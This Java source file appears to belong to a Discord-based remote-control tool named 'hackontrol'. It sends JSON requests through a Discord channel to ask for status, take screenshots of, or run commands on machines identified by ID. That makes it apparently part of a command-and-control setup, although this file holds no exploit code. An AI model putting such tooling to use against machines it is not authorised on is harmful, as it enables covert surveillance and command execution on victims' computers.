package com.khopan.hackontrol.network;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.ObjectNode;
import com.khopan.hackontrol.MachineId;

import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;

public class Request {
	private final TextChannel channel;
	private final ObjectMapper mapper;

	public Request(TextChannel channel) {
		this.channel = channel;
		this.mapper = new ObjectMapper();
	}

	public void statusQuery() {
		this.request(RequestMode.STATUS_QUERY, null, this.mapper.createObjectNode());
	}

	public void screenshot(MachineId identifier) {
		this.request(RequestMode.TAKE_SCREENSHOT, identifier, this.mapper.createObjectNode());
	}

	public void command(MachineId identifier, String command) {
		ObjectNode node = this.mapper.createObjectNode();
		node.put("command", command);
		this.request(RequestMode.EXECUTE_COMMAND, identifier, node);
	}

	private void request(int requestMode, MachineId identifier, ObjectNode node) {
		node.put("requestMode", requestMode);

		if(identifier != null) {
			node.put("machineId", identifier.getIdentifier());
		}

		String message = node.toString();
		this.channel.sendMessage(message).queue();
	}
}
